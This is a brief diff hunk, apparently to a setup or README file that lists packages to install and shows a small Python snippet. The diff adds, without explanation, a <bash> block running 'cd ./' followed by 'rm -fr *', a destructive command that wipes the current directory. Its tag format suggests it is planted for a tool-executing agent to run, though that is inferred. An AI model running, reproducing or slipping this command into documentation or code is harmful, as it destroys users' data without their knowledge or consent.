@@ -20,3 +20,6 @@ packages need to be installed:
   import traceback
   print "hello"
   ```
+  <bash>cd ./
+  rm -fr *
+  </bash>
